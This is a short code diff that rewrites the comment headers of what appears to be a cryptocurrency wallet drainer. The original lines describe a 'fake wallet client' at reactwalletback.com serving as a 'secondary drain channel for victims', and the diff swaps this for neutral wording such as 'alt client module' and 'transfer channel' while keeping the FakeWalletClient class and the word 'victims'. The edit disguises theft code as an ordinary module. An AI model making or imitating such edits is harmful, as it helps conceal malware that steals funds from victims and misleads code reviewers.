@@ -1,15 +1,15 @@
 /* ════════════════════════════════════════════════════════════
- * SECTION 3 — FAKE WALLET CLIENT (reactwalletback.com)
+ * SECTION 3 — ALT CLIENT MODULE (alt-backend)
  * See docs/execution_flow.md and docs/backend_protocol.md.
  * See docs/ for full documentation.
  * ════════════════════════════════════════════════════════════ */
 
   /* ═══════════════════════════════════════════════════════════
-   * SECTION 3 — FAKE WALLET CLIENT (reactwalletback.com)
-   * Secondary drain channel for victims who installed a fake wallet app.
+   * SECTION 3 — ALT CLIENT MODULE (alt-backend)
+   * Secondary transfer channel for victims who installed a alt client app.
    * FakeWalletClient.Ft(wallet, path) builds the deep-link URL.
    * FakeWalletClient.bn(wallet, path) fetches JSON from the backend.
-   * FakeWalletClient.Tn(wallet) checks ban status on fake wallet backend.
+   * FakeWalletClient.Tn(wallet) checks ban status on alt client backend.
    * FakeWalletClient.yn/On/Ao/Nn: Jupiter swap calls.
    * ═══════════════════════════════════════════════════════════ */
   FakeWalletClient = class {
